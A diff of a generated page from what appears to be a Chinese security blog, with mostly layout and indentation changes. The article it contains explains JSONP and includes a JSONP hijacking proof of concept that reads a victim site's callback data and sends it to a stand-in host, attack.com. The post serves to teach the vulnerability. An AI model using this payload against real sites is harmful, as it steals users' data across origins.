@@ -437,15 +437,15 @@
         </div>
         <hr class="clearfix">
 
-        <!-- 是否加载使用自带的 prismjs.
-        <link rel="stylesheet" href="/libs/prism/prism.min.css"> -->
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
 
-        <!-- 
-         -->
 
-        <div class="card-content article-card-content">
-            <div id="articleContent">
-                <h4 id="1-jsonp"><a href="#1-jsonp" class="headerlink" title="1. jsonp"></a>1. jsonp</h4><p>jsonp是一种协议，准确的说，他是json的一种使用模式，为了解决Json受同源策略限制的问题<br>是一种使用JSON格式数据的跨域请求方式。其主要目的是绕过同源策略限制，使得网页可以通过<code>&lt;script&gt;</code>标签从不同源的服务器加载数据。主要还是利用同源策略中script 标签的src属性可以加载外部的js这个特性来跨域传输json数据。</p>
+        
+
+                <div class="card-content article-card-content">
+                    <div id="articleContent">
+                        <h4 id="1-jsonp"><a href="#1-jsonp" class="headerlink" title="1. jsonp"></a>1. jsonp</h4><p>jsonp是一种协议，准确的说，他是json的一种使用模式，为了解决Json受同源策略限制的问题<br>是一种使用JSON格式数据的跨域请求方式。其主要目的是绕过同源策略限制，使得网页可以通过<code>&lt;script&gt;</code>标签从不同源的服务器加载数据。主要还是利用同源策略中script 标签的src属性可以加载外部的js这个特性来跨域传输json数据。</p>
 <h4 id="2-jsonp实现"><a href="#2-jsonp实现" class="headerlink" title="2. jsonp实现"></a>2. jsonp实现</h4><p>script标签的src属性能够发起跨域请求的原理来实现的</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">   <span class="comment">&lt;!-- 回调函数--&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">   function callback(data)&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">   alert(&quot;name:&quot;+data.username+&quot;  passwrod:&quot;+data.password);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">   &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.43.136/test.json&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -464,11 +464,11 @@
 
 <h5 id="4-3-构造恶意请求"><a href="#4-3-构造恶意请求" class="headerlink" title="4.3 构造恶意请求"></a>4.3 构造恶意请求</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;lol&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jsonp_hack</span>(<span class="params">v</span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">alert</span>(<span class="string">&quot;JSONP hijacking&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> h = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> key in v)&#123;</span><br><span class="line">            <span class="keyword">var</span> a = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            a = key + <span class="string">&#x27; : &#x27;</span> + v[key] + <span class="string">&#x27; ,&#x27;</span>;</span><br><span class="line">            h += a;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">alert</span>(h);</span><br><span class="line">        $.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;http://attack.com/index.html?value=&#x27;</span>+h);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;http://victim.com/info.php?callback=jsonp_hack&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Welcome&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
-                    
-            </div>
-            <hr />
+                            
+                    </div>
+                    <hr />
 
-            
+                    
 
     <div class="reprint" id="reprint-statement">
         
@@ -522,23 +522,23 @@
 
 
 
-                <div class="tag_share" style="display: block;">
-                    <div class="post-meta__tag-list" style="display: inline-block;">
-                        
-                            <div class="article-tag">
+                        <div class="tag_share" style="display: block;">
+                            <div class="post-meta__tag-list" style="display: inline-block;">
                                 
-                                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
-                                        <span class="chip bg-color">
-                                            漏洞分析
-                                        </span>
-                                    </a>
+                                    <div class="article-tag">
+                                        
+                                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+                                                <span class="chip bg-color">
+                                                    漏洞分析
+                                                </span>
+                                            </a>
+                                            
+                                    </div>
                                     
                             </div>
-                            
-                    </div>
-                    <div class="post_share"
-                        style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
-                        <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+                            <div class="post_share"
+                                style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                                <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
 <div id="article-share">
 
     
@@ -550,10 +550,10 @@
 
 </div>
 
-                    </div>
+                            </div>
+                        </div>
+                        
                 </div>
-                
-        </div>
     </div>
 
     
@@ -682,20 +682,23 @@
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
 
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+  
 
-<!-- 代码语言 -->
+    <!-- 代码语言 -->
+    
 
+        <!-- 代码块复制 -->
+        
+          <script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+          
 
-<!-- 代码块复制 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
-
-
-<!-- 代码块收缩 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
-
-
+            <!-- 代码块收缩 -->
+            
+              <script type="text/javascript"
+                src="/libs/codeBlock/codeShrink.js"></script>
+              
     </div>
     <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
         <div class="toc-widget card" style="background-color: white;">
@@ -801,7 +804,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">125.3k</span>
+                        class="white-color">125.5k</span>
             
             
             
